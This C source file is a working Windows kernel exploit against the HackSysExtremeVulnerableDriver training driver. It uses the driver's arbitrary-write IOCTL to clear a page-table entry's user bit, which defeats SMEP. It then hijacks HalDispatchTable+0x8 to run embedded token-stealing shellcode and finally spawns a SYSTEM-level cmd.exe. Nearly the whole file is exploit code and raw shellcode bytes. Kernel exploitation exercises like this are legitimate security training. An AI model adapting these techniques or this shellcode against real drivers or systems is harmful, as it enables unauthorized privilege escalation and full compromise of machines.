
#include <stdio.h>
#include <windows.h>

#define MAXIMUM_FILENAME_LENGTH 255 

//0x4 bytes (sizeof)
enum _KPROFILE_SOURCE
{
	ProfileTime = 0,
	ProfileAlignmentFixup = 1,
	ProfileTotalIssues = 2,
	ProfilePipelineDry = 3,
	ProfileLoadInstructions = 4,
	ProfilePipelineFrozen = 5,
	ProfileBranchInstructions = 6,
	ProfileTotalNonissues = 7,
	ProfileDcacheMisses = 8,
	ProfileIcacheMisses = 9,
	ProfileCacheMisses = 10,
	ProfileBranchMispredictions = 11,
	ProfileStoreInstructions = 12,
	ProfileFpInstructions = 13,
	ProfileIntegerInstructions = 14,
	Profile2Issue = 15,
	Profile3Issue = 16,
	Profile4Issue = 17,
	ProfileSpecialInstructions = 18,
	ProfileTotalCycles = 19,
	ProfileIcacheIssues = 20,
	ProfileDcacheAccesses = 21,
	ProfileMemoryBarrierCycles = 22,
	ProfileLoadLinkedIssues = 23,
	ProfileMaximum = 24
};

typedef NTSTATUS (*_NtQueryIntervalProfile)(
	IN _KPROFILE_SOURCE      ProfileSource,
	OUT PULONG              Interval);

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(*_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);

typedef struct _WRITE_WHAT_WHERE {
	void* What;
	void* Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

# define SHELLCODE_SIZE 80

char pShellcode[] = {
	0x48, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC9, 0x65, 
	0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 
	0x80, 0x20, 0x02, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x4D, 0x8B, 
	0x89, 0xF0, 0x02, 0x00, 0x00, 0x49, 0x81, 0xE9, 0xF0, 0x02, 
	0x00, 0x00, 0x49, 0x8B, 0x89, 0xE8, 0x02, 0x00, 0x00, 0x48, 
	0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x05, 0x58, 0x03, 0x00, 
	0x00, 0x4D, 0x8B, 0x89, 0x58, 0x03, 0x00, 0x00, 0x4C, 0x89, 
	0x08, 0x90, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

void SpawnShell() {

	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { 0 };
	Si.cb = sizeof(STARTUPINFOW);

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr, nullptr, &Si, &Pi);
}


UINT64 GetNtBase() {
	NTSTATUS Status = 0x0;
	ULONG ReturnLength = 0;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

	if (NtQuerySystemInformation == nullptr) {
		printf("\n[ERROR GETTING THE ADDRESS TO \"NtQuerySystemInformation\"]\n");
		return 0;
	}

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &ReturnLength);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(nullptr, ReturnLength,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, pModuleInfo, ReturnLength, &ReturnLength);
	if (Status != 0x0) {
		printf("\nError getting the length of the Module Struct -> 0x%0.16X\n", Status);
		return 0;
	}

	printf("\n[Module Name] %s\n\t\\__[Base Address] 0x%p\n\t\\__[Module Size] %p\n",
		pModuleInfo->Modules[0].Name, pModuleInfo->Modules[0].ImageBaseAddress, pModuleInfo->Modules[0].ImageSize);

	char* ModuleName = pModuleInfo->Modules[0].Name;
	PVOID ModuleBase = pModuleInfo->Modules[0].ImageBaseAddress;
	ULONG ModuleSize = pModuleInfo->Modules[0].ImageSize;

	printf("\npModuleInfo->Modules[0] -> 0x%p\n", pModuleInfo->Modules[0]);

	VirtualFree(pModuleInfo, ReturnLength, MEM_RELEASE);

	return (UINT64)ModuleBase;
}


int main() {

	UINT64 pKernelBase = GetNtBase();

	if (pKernelBase == 0) {
		printf("\n[!] ERROR GETTING THE KERNEL BASE ADDRESS\n");
		getchar();
		return -1;
	}
	printf("\n[KERNEL BASE Addr] -> 0x%p\n", pKernelBase);

	HMODULE hKernelBase = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
	if (hKernelBase == INVALID_HANDLE_VALUE) {
		printf("\n[!] ERROR GETTING A HANDLE TO \"ntoskrnl.exe\": %d\n", GetLastError());
		getchar();
		return -1;
	}
	printf("[hKernelBase] -> 0x%p\n", hKernelBase);

	UINT64 OffHalDispatchTable = 0;
	PVOID pHalDispatchTable = GetProcAddress(hKernelBase, "HalDispatchTable");
	if (pHalDispatchTable == nullptr) {
		printf("\n[!] ERROR GETTING THE ADDRESS TO \"HalDispatchTable\": %d\n", GetLastError());
		CloseHandle(hKernelBase);
		getchar();
		return -1;
	}
	else {
		OffHalDispatchTable = (UINT_PTR)pHalDispatchTable - (UINT_PTR)hKernelBase;
		printf("\n[HalDispatchTable KM Address] -> 0x%p\n\t\\__[HalDispatchTable Offset] -> 0x%p\n", (pKernelBase + OffHalDispatchTable), OffHalDispatchTable);
		CloseHandle(hKernelBase);
	}

	HANDLE hHEVD = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),
		0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hHEVD == INVALID_HANDLE_VALUE) {
		printf("\nError getting a handle to the driver\n");
		CloseHandle(hKernelBase);
		getchar();
		//return -1;
	}
	printf("HANDLE created successfully!\n");
	
	WRITE_WHAT_WHERE WhaWhe = { 0 };

	void* ShellcodeAddr = VirtualAlloc(nullptr, SHELLCODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(ShellcodeAddr, pShellcode, SHELLCODE_SIZE);

	UINT64 ShellcodePageBase = (ULONG_PTR)ShellcodeAddr >> 9;
	ShellcodePageBase &= 0x7FFFFFFFF8;
	ShellcodePageBase += 0xFFFFF68000000000;

	printf("\n[UM Shellcode Page Base] -> 0x%p\n", ShellcodePageBase);

	PVOID Pte_details = nullptr;

	WhaWhe.What = (void*)ShellcodePageBase;
	WhaWhe.Where = (void*)&Pte_details;

	ULONG lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;
	
	printf("[+] PTE Details -> 0x%p\n", Pte_details);

	printf("[0x4 bit form U to K]\n");
	*(UINT64*)&Pte_details &= ~(0x4);
	printf("[+] PTE Details -> 0x%p\n", Pte_details);


	WhaWhe.What = (void*)&Pte_details;
	WhaWhe.Where = (void*)ShellcodePageBase;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	printf("[Page changed to Kernel Mode]\n");

	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

	UINT64 HalDispatchTable0x8 = (pKernelBase + OffHalDispatchTable + 0x8);
	WhaWhe.What = (void*)&ShellcodeAddr;
	WhaWhe.Where = (void*)HalDispatchTable0x8;

	lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	
	printf("\n[+] HalDispatchTable0x8 changed successfully\n");
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == nullptr) {
		printf("\n[!] ERROR GETTING THE POINTER TO \"NtQueryIntervalProfile\": %d\n", GetLastError());
		VirtualFree(ShellcodeAddr, 160, MEM_RELEASE);
		CloseHandle(hHEVD);
		getchar();
		return -1;
	}
	printf("[NtQueryIntervalProfile] -> 0x%p\n", NtQueryIntervalProfile);


	ULONG Interval = 0;
	NTSTATUS Status = NtQueryIntervalProfile((_KPROFILE_SOURCE)0x3, &Interval);
	if (Status != 0) {
		printf("\nERROR EXECUTING \"NtQueryIntervalProfile\": 0x%0.16X\n", Status);
		VirtualFree(ShellcodeAddr, SHELLCODE_SIZE, MEM_RELEASE);
		CloseHandle(hHEVD);
		getchar();
		return -1;
	}

	// Restore the changed address to avoid BSOD
	WhaWhe.What = (void*)&HalDispatchTable0x8;
	WhaWhe.Where = (void*)HalDispatchTable0x8;

	lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);

	printf("\n[+] HalDispatchTable0x8 restored successfully\n");
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;


	*(UINT64*)&Pte_details |= 0x4;

	WhaWhe.What = (void*)&Pte_details;
	WhaWhe.Where = (void*)ShellcodePageBase;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	printf("[Page Restored successfully to UM]\n");

	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

	printf("\nGenerating a Shell...\n");

	SpawnShell();

	CloseHandle(hHEVD);
	// VirtualFree(ShellcodeAddr, SHELLCODE_SIZE, MEM_RELEASE);
	return 0;
}